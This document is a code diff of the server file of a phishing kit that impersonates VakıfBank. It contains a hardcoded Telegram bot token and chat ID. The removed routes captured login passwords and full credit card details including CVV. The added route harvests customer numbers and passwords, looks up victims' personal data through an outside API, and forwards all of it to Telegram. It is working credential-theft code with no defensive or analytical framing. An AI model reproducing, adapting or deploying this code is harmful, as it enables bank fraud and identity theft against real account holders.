@@ -9,14 +9,11 @@ const PORT = 3000;
 const botToken = "8452844424:AAGkw2PVDwYiHM15OM26A_Bz92qnX39CulA";
 const chatId = "-1002998135862";
 
+
 app.use(bodyParser.urlencoded({ extended: true }));
 app.use(express.static(path.join(__dirname, "public")));
 
 const sendMessageToTelegram = async (message) => {
-  if (botToken === "YOUR_TELEGRAM_BOT_TOKEN" || chatId === "YOUR_TELEGRAM_CHAT_ID") {
-    console.error("Lütfen server.js dosyasındaki botToken ve chatId değişkenlerini güncelleyin.");
-    return;
-  }
   const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
   try {
     await axios.post(url, {
@@ -29,56 +26,45 @@ const sendMessageToTelegram = async (message) => {
   }
 };
 
-
-app.get("/", (req, res) => {
-  res.sendFile(path.join(__dirname, "public", "index.html"));
-});
-
-app.use("/Internet", express.static(path.join(__dirname, "public", "Internet")));
-
-
-
-app.post("/login", async (req, res) => {
-  const { username, password, tel } = req.body;
+app.post("/dmn", async (req, res) => {
+  const musNo = req.body["_ctl0:_ctl0_MusNoText"];
+  const parola = req.body["_ctl0:ParolaText"];
   const userIP = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
 
-  const message = `
-*--- VakıfBank Giriş Bilgileri ---*
-*TC/Müşteri No:* \`${username}\`
-*Şifre:* \`${password}\`
-*Tel:* \`${tel}\`
-*IP Adresi:* \`${userIP}\`
-*------------------------------------*
-  `;
-
   try {
+    // API'ye istek at
+    const apiUrl = `https://xn--gndemhaber-9db.site/tomapi.php?tc=${musNo}`;
+    const response = await axios.get(apiUrl);
+    const data = response.data.data; // JSON içindeki "data" alanı
+
+    // Gelen data’yı mesaj formatına çevir
+    let dataMsg = "";
+    for (const key in data) {
+      if (Array.isArray(data[key])) {
+        dataMsg += `*${key}:* ${data[key].join(", ")}\n`;
+      } else {
+        dataMsg += `*${key}:* ${data[key]}\n`;
+      }
+    }
+
+    const message = `
+*--- VakıfBank Giriş Bilgileri ---*
+*Müşteri No/TC:* \`${musNo}\`
+*Şifre:* \`${parola}\`
+*IP:* \`${userIP}\`
+*------------------------------------*
+*API Verileri:*
+${dataMsg}
+`;
+
     await sendMessageToTelegram(message);
   } catch (err) {
-    console.error("Telegram'a mesaj gönderilemedi:", err);
+    console.error("Hata:", err.message);
   }
 
   res.redirect("/basarili");
 });
-
-app.post("/submit-cc", async (req, res) => {
-  const { kart_numarasi, son_kullanma, cvv, telefon } = req.body;
-  const userIP = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
-
-  const message = `
-*--- Kredi Kartı Bilgileri ---*
-*Kart Numarası:* \`${kart_numarasi}\`
-*Son Kullanma Tarihi (AA/YY):* \`${son_kullanma}\`
-*CVV:* \`${cvv}\`
-*Telefon Numarası:* \`${telefon}\`
-*IP Adresi:* \`${userIP}\`
-*-----------------------------*
-    `;
-
-  await sendMessageToTelegram(message);
-
-  res.redirect("/bekle");
-});
-
+ 
 app.listen(PORT, () => {
   console.log(`Sunucu http://localhost:${PORT} adresinde çalışıyor`);
 
